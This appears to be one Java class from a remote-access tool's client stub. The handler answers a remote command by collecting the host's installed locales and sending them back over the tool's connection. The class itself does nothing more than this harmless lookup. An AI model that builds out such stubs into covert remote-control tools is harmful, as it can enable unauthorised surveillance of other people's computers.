package com.redpois0n.stub.packets.incoming;

import java.util.Locale;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.packets.outgoing.Packet11InstalledLocales;

public class Packet97Locales extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		Locale[] installed = Locale.getAvailableLocales();
			
		Connection.addToSendQueue(new Packet11InstalledLocales(installed));
	}

}
